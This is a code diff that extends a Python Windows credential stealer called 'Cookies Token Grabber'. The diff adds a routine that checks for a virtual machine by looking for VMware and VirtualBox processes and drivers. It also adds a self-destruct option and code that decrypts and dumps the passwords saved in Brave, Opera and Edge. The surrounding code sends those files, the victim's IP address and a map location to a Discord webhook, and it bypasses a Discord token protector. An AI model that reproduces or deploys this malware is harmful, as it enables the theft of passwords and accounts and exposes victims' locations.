@@ -9,7 +9,11 @@ import sqlite3
 import zipfile
 import threading
 import subprocess
-
+import sys
+import base64
+import pyautogui
+import win32crypt
+import getpass
 from sys import argv
 from PIL import ImageGrab
 from base64 import b64decode
@@ -27,7 +31,9 @@ config = {
     # if you want the file to run at startup
     'startup': False,
     # if you want the file to hide itself after run
-    'hide_self': False
+    'hide_self': False,
+    # If you want to self destruct files after running change here
+    'self_destruct': False
 }
 
 
@@ -128,6 +134,8 @@ class Cookies_Token_Grabber(functions):
             function_list.append(self.grabPassword)
             function_list.append(self.grabCookies)
 
+        self.grab_other_passwords()
+
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
             process.start()
@@ -181,8 +189,119 @@ class Cookies_Token_Grabber(functions):
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
 
+    def virtual_machine_check(self):
+        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))
+
+        FOUND = False
+        detection = ""
+
+        VmCehck1 = "vmsrvc.exe"
+        VmCehck2 = "vmusrvc.exe"
+        VmCehck3 = "vboxtray.exe"
+        VmCehck4 = "vmtoolsd.exe"
+        VmCehck5 = "df5serv.exe"
+        VmCehck6 = "vboxservice.exe"
+        for process in psutil.process_iter():
+            try:
+                if process.name().lower() == VmCehck1.lower():
+                    FOUND = True
+                else:
+                    pass
+
+                if process.name().lower() == VmCehck2.lower():
+                    FOUND = True
+                else:
+                    pass
+
+                if process.name().lower() == VmCehck3.lower():
+                    FOUND = True
+                else:
+                    pass
+
+                if process.name().lower() == VmCehck4.lower():
+                    FOUND = True
+                else:
+                    pass
+
+                if process.name().lower() == VmCehck5.lower():
+                    FOUND = True
+                else:
+                    pass
+
+                if process.name().lower() == VmCehck6.lower():
+                    FOUND = True
+                else:
+                    pass
+            except Exception as e:
+                pass
+
+        vmci = os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys")
+        vmhgfs = os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys")
+        vmmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys")
+        vmsci = os.path.exists("C:\WINDOWS\system32\drivers\vmsci.sys")
+        vmusbmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys")
+        vmx_svga = os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys")
+        VBoxMouse = os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys")
+
+
+        if vmci == True:
+            FOUND = True
+        else:
+            pass
+
+        if vmhgfs == True:
+            FOUND = True
+        else:
+            pass
+
+        if vmmouse == True:
+            FOUND = True
+        else:
+            pass
+
+        if vmsci == True:
+            FOUND = True
+        else:
+            pass
+
+        if vmusbmouse == True:
+            FOUND = True
+        else:
+            pass
+
+        if vmx_svga == True:
+            FOUND = True
+        else:
+            pass
+
+        if VBoxMouse == True:
+            FOUND = True
+        else:
+            pass
+
+        # Finshed Checking for VM
+        if FOUND == True:
+            detection = "VM detected!"
+        else:
+            detection = "VM not detected"
+        
+        return detection
+
+
+    def self_destruct_grabber(self):
+        temp = (os.getenv("temp"))
+        # cwd2 = sys.argv[0]
+        # bat = """@echo off\n"""+ "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
+        # temp6 = temp + r"\\kill.bat"
+        # if os.path.isfile(temp6):
+        #     os.remove(temp6)
+        # f6 = open(temp + r"\\kill.bat", 'w')
+        # f6.write(bat)
+        # f6.close()
+        # os.system(r"start /min %temp%\\kill.bat")
+
+
     async def bypassTokenProtector(self):
-        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not os.path.exists(tp):
             return
@@ -352,6 +471,140 @@ class Cookies_Token_Grabber(functions):
         conn.close()
         os.remove(login)
 
+    def grab_other_passwords(self):
+        def decrypt_payload(cipher, payload):
+            return cipher.decrypt(payload)
+        def generate_cipher(aes_key, iv):
+            return AES.new(aes_key, AES.MODE_GCM, iv)
+        def decrypt_password(buff, master_key):
+            try:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = generate_cipher(master_key, iv)
+                decrypted_pass = decrypt_payload(cipher, payload)
+                decrypted_pass = decrypted_pass[:-16].decode()
+                return decrypted_pass
+            except Exception as e:
+                print(str(e))
+
+
+        username = getpass.getuser()
+        #######################################################################
+        #######################################################################
+        #######################################################################
+        try:
+            def get_master_key():
+                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State', "r", encoding='utf-8') as f:
+                    local_state = f.read()
+                    local_state = json.loads(local_state)
+                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                master_key = master_key[5:]  # removing DPAPI
+                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                return master_key
+            if __name__ == '__main__':
+                master_key = get_master_key()
+                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data'
+                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+                conn = sqlite3.connect("Loginvault.db")
+                cursor = conn.cursor()
+                try:
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for r in cursor.fetchall():
+                        url = r[0]
+                        username = r[1]
+                        encrypted_password = r[2]
+                        decrypted_password = decrypt_password(encrypted_password, master_key)
+                        with open(self.dir + "\\BravePasswords.txt","a") as f:
+                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
+                            f.close()  
+                except Exception as e:
+                    pass
+                cursor.close()
+                conn.close()
+                try:
+                    os.remove("Loginvault.db")
+                except Exception as e:
+                    pass
+        except FileNotFoundError:
+            pass
+        #######################################################################
+        #######################################################################
+        #######################################################################
+        try:
+            def get_master_key():
+                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State', "r", encoding='utf-8') as f:
+                    local_state = f.read()
+                    local_state = json.loads(local_state)
+                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                master_key = master_key[5:]  # removing DPAPI
+                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                return master_key
+            if __name__ == '__main__':
+                master_key = get_master_key()
+                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
+                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+                conn = sqlite3.connect("Loginvault.db")
+                cursor = conn.cursor()
+                try:
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for r in cursor.fetchall():
+                        url = r[0]
+                        username = r[1]
+                        encrypted_password = r[2]
+                        decrypted_password = decrypt_password(encrypted_password, master_key)
+                        with open(self.dir + "\\OperaPasswords.txt","a") as f:
+                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
+                            f.close()
+                except Exception as e:
+                    pass
+                cursor.close()
+                conn.close()
+                try:
+                    os.remove("Loginvault.db")
+                except Exception as e:
+                    pass
+        except FileNotFoundError:
+            pass
+        #######################################################################
+        #######################################################################
+        #######################################################################
+        try:
+            def get_master_key():
+                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
+                    local_state = f.read()
+                    local_state = json.loads(local_state)
+                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                master_key = master_key[5:]  # removing DPAPI
+                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                return master_key
+            if __name__ == '__main__':
+                master_key = get_master_key()
+                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+                conn = sqlite3.connect("Loginvault.db")
+                cursor = conn.cursor()
+                try:
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for r in cursor.fetchall():
+                        url = r[0]
+                        username = r[1]
+                        encrypted_password = r[2]
+                        decrypted_password = decrypt_password(encrypted_password, master_key)
+                        with open(self.dir + "\\EdgePasswords.txt","a") as f:
+                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
+                            f.close()             
+                except Exception as e:
+                    pass
+                cursor.close()
+                conn.close()
+                try:
+                    os.remove("Loginvault.db")
+                except Exception as e:
+                    pass
+        except FileNotFoundError:
+            pass
+
+
     def neatifyTokens(self):
         f = open(self.dir+"\\Discord Info.txt",
                  "w", encoding="cp437", errors='ignore')
@@ -444,17 +697,12 @@ class Cookies_Token_Grabber(functions):
                             fp.write(
                                 x+"\n\nCookies Token Grabber | cookiesservices.xyz")
         w = self.getProductValues()
-        wname = w[0].replace(" ", "")
-        wkey = w[1].replace(" ", "")
-        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
-        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
-        # ip, country, city, region, googlemap = "None"
+        detection = self.virtual_machine_check()
         data = httpx.get("https://ipinfo.io/json").json()
         ip = data.get('ip').replace(" ", "")
         city = data.get('city').replace(" ", "")
         country = data.get('country').replace(" ", "")
         region = data.get('region').replace(" ", "")
-        org = data.get('org').replace(" ", "")
         googlemap = "https://www.google.com/maps/search/google+map++" + \
             data.get('loc')
 
@@ -485,7 +733,7 @@ class Cookies_Token_Grabber(functions):
                         "url": "",
                         "icon_url": ""
                     },
-                    "description": f"**{os.getlogin()}** Just ran Cookies Token Grabber\n\n[Google Maps Location]({googlemap})\n\n```ComputerName: {os.getenv('COMPUTERNAME')}\n\nIP: {ip}\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}```\n\n\n{fileCount}```{json.dumps(files, indent=4)}```\n", # To login with discord token goto [here]() copy the RAW code then goto [discord.com/login]() and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)
+                    "description": f"**{os.getlogin()}** Just ran Cookies Token Grabber\n\nVM Status: {detection}\n[Google Maps Location]({googlemap})\n\n```ComputerName: {os.getenv('COMPUTERNAME')}\n\nIP: {ip}\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}```\n\n\n{fileCount}```{json.dumps(files, indent=4)}```\n", # To login with discord token goto [here]() copy the RAW code then goto [discord.com/login]() and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)
                     "color": 11600892,
                                                                                                                                         # Add local ip ^^
                     "thumbnail": {
@@ -502,6 +750,22 @@ class Cookies_Token_Grabber(functions):
         with open(_zipfile, 'rb') as f:
             httpx.post(self.webhook, files={'upload_file': f})
         os.remove(_zipfile)
+
+        if self.config('self_destruct'):
+            self.self_destruct_grabber()
+
+        brave = self.dir + "\\BravePasswords.txt"
+        opera = self.dir + "\\OperaPasswords.txt"
+        edge = self.dir + "\\EdgePasswords.txt"
+
+        if os.path.exists(brave):
+            os.remove(brave)
+        
+        if os.path.exists(opera):
+            os.remove(opera)
+        
+        if os.path.exists(edge):
+            os.remove(edge)
 
 
 if __name__ == "__main__" and os.name == "nt":
